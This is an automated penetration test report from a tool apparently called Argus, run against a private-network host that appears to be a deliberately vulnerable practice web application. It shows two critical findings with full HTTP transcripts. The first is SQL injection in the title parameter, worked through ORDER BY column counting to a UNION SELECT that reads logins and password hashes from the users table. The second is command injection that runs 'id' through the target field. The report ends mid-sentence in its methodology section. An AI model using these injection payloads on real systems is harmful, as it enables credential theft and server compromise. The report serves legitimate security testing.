# Penetration Test Report - 20261116-015301-192.168.223.221

- **Target:** `192.168.223.221` (20261116-015301-192.168.223.221)
- **Date:** 2026-11-16 01:53:01
- **Duration:** 605.2s
- **Agent model:** probe-driver
- **Argus version:** 1.0.0
- **Requests sent:** 23

## Executive summary

Probe-driven run: the operator named the endpoints; the probes, the evidence gate and this report are the system's own.

| Severity | Count |
|---|---|
| Critical | 2 |

| Proof grade | Count | Meaning |
|---|---|---|
| **proven** | 2 | the class-specific artifact and its control are on record |

| OWASP Top 10 (2021) | Findings |
|---|---|
| A03 Injection | F01, F02 |

## Engagement constraints

- **Scope hosts:** (target only)
- **Excluded paths:** none
- **Budgets:** ? turns, ? requests, ? rps
- **Proxy:** no · **TLS verify:** no
- **Tool surface:** all


## Findings

### F01 - SQL injection in sqli_1.php title parameter

- **Severity:** Critical
- **Category:** sqli · **proof: proven**
- **CWE:** `CWE-89`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8080`
- **Evidence:** r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, r13, r14, r15, r16, r17, r18, r19, r20

**Description**  
SQL injection via the `title` parameter: the engine names itself and a bounded UNION read returns rows from `users`.

**Proof (verbatim excerpt)**  
```
6885858486f31043e5839c735d99457f045affd0
```

**Remediation**  
Use parameterised queries.

**Proof grade: proven**  

_Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r20
- [x] data store fingerprinted - 5.5.9-1ubuntu in r1
- [x] the query named its target - users in r20
- [x] the rows are not what the page serves anyway - 6885858486f31043e5839c735d99457f045affd0 in r20 and in no control
- [x] rows returned, not an error message - quoted from r20
- [x] extraction stayed minimal
- [ ] the citation is small enough to grade whole - 20 exchanges cited; the first 16 were paired. A contrast needs two exchanges - cite the pair that proves it

<details><summary>Transcript r1: GET http://192.168.223.221:8080/sqli_1.php?title=1&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r2: GET http://192.168.223.221:8080/sqli_1.php?title=1%27&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 1006
keep-alive: timeout=5, max=99
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r3: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%271&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%271&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=98
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r4: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%272&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%272&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=97
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r5: GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D1&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D1&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=96
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r6: GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D2&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D2&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=95
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r7: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%271&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%271&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=94
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r8: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%272&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+OR+%271%27%3D%272&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=93
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r9: GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D1&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D1&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=92
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r10: GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D2&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1+OR+1%3D2&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=91
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r11: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 958
keep-alive: timeout=5, max=90
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r12: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+1--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+1--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=89
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r13: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+2--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+2--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=88
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r14: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+3--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+3--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=87
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r15: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+4--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+4--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=86
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r16: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+5--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+5--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=85
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r17: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+6--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+6--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=84
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r18: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+7--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+7--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3629
keep-alive: timeout=5, max=83
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r19: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+8--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+8--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 945
keep-alive: timeout=5, max=82
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r20: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+UNION+SELECT+login%2C+password%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL+FROM+users+LIMIT+5--+-&amp;action=search -> 200</summary>

```http
GET http://192.168.223.221:8080/sqli_1.php?title=1%27+UNION+SELECT+login%2C+password%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL+FROM+users+LIMIT+5--+-&action=search
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••

HTTP/200
date: Mon, 16 Nov 2026 06:53:02 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3662
keep-alive: timeout=5, max=81
connection: Keep-Alive
content-type: text/html

          <td width="80"><b>IMDb</b></td>

        </tr>

        <tr height="30">

            <td>6885858486f31043e5839c735d99457f045affd0</td>
            <td align="center"></td>
            <td></td>
            <td align="center"></td>
            <td align="center"><a href="http://www.imdb.com/title/" target="_blank">Link</a></td>

        </tr>

        <tr height="30">

            <td>6885858486f31043e5839c735d99457f045affd0</
```
</details>

### F02 - OS command injection in commandi.php target parameter

- **Severity:** Critical
- **Category:** rce · **proof: proven**
- **CWE:** `CWE-78`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8080`
- **Evidence:** r21, r22, r23

**Description**  
The `target` field reaches a shell: `id` output came back with this probe's own nonce.

**Proof (verbatim excerpt)**  
```
uid=33(www-data)
```

**Remediation**  
Never pass request values to a shell.

**Proof grade: proven**  

_Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r23
- [x] a benign command was sent - exchange r23
- [x] identity output returned by the target - 'uid=33(www-data)' in r23
- [x] the quoted bytes are the command output - 'uid=33(www-data)' carries the identity line
- [x] the probe nonce came back in the output - 'argus9a27ascr' in r23
- [x] proof command stayed benign

<details><summary>Transcript r21: POST http://192.168.223.221:8080/commandi.php -> 200</summary>

```http
POST http://192.168.223.221:8080/commandi.php
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 28

target=127.0.0.1&form=submit

HTTP/200
date: Mon, 16 Nov 2026 07:03:03 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3480
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r22: POST http://192.168.223.221:8080/commandi.php -> 200</summary>

```http
POST http://192.168.223.221:8080/commandi.php
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 28

target=127.0.0.2&form=submit

HTTP/200
date: Mon, 16 Nov 2026 07:03:03 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3480
keep-alive: timeout=5, max=99
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Architects+Daughter">-->
<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="scree
```
</details>

<details><summary>Transcript r23: POST http://192.168.223.221:8080/commandi.php -> 200</summary>

```http
POST http://192.168.223.221:8080/commandi.php
host: 192.168.223.221:8080
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: python-httpx/0.27.2
cookie: PHPSESSID=•••redacted•••; security_level=•••redacted•••
content-type: application/x-www-form-urlencoded
content-length: 56

target=127.0.0.1%3B+id%3B+echo+argus9a27ascr&form=submit

HTTP/200
date: Mon, 16 Nov 2026 07:03:03 GMT
server: Apache/2.4.7 (Ubuntu)
x-powered-by: PHP/5.5.9-1ubuntu4.14
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
vary: Accept-Encoding
content-encoding: gzip
content-length: 3514
keep-alive: timeout=5, max=98
connection: Keep-Alive
content-type: text/html

="submit" name="form" value="submit">Lookup</button>

        </p>

    </form>
    <p align="left">uid=33(www-data) gid=33(www-data) groups=33(www-data)
argus9a27ascr
</p>
</div>

<div id="side">

    <a href="http://twitter.com/MME_IT" target="blank_" class="button"><img src="./images/twitter.png"></a>
    <a href="http://be.linkedin.com/in/malikmesellem" target="blank_" class="button"><img src="./images/linked
```
</details>


## Test coverage

| Tool | Requests |
|---|---|
| probe_cmdi | 3 |
| probe_sqli | 20 |

**Probe families run:** probe_cmdi, probe_sqli

**Endpoints exercised (2):**

- `GET /sqli_1.php?action&title`
- `POST /commandi.php`

## Methodology

Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
mapping -> hypothesis-driven probes (matched true/false pairs,
